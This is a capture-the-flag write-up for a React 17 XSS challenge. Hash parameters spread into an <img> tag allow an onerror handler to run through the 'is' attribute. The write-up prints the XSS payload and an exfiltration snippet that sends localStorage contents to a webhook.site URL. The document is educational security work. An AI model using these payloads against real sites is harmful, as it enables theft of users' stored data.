# Live Art — XSS Writeup

## 1. Vulnerability Analysis

The challenge uses React 17 and Puppeteer. The bot stores the flag in `localStorage` under the key `username`:

```javascript
localStorage.setItem("username", JSON.stringify(flag));
```

In `viewer/index.tsx`, URL fragment parameters are directly spread into an `<img>` element:

```tsx
const params = useHashParams();

<img src={props.image} {...dimensions} {...params}/>
```

By adding `is=x-test`, we can exploit React 17's handling of customized built-in elements to inject an executable `onerror` attribute, resulting in XSS.

## 2. XSS Payload

First, verify the vulnerability:

```text
/drawing/test#is=x-test&src=invalid&onerror=alert(1)
```

- `is=x-test`: Triggers React's custom element handling.
- `src=invalid`: Causes the image to fail loading.
- `onerror=alert(1)`: Executes JavaScript when the image fails.

## 3. Flag Exfiltration

Replace `alert(1)` with:

```javascript
new Image().src =
  "https://webhook.site/YOUR-UUID?flag=" +
  encodeURIComponent(localStorage.getItem("username"));
```

Then URL-encode the JavaScript and insert it into the `onerror` parameter.

Submit the crafted URL through `/fan-mail`:

```text
http://localhost:4000/drawing/test#is=x-test&src=invalid&onerror=<URL_ENCODED_PAYLOAD>
```

The Puppeteer bot first stores the flag under the `http://localhost:4000` origin, then visits the submitted URL. The XSS executes in the same origin and sends the flag to Webhook.site.

## 4. Result

The flag is received through the Webhook.site request logs.

**Root cause:** User-controlled URL fragment parameters are spread into a React `<img>` element, allowing XSS through React 17's custom element attribute handling.
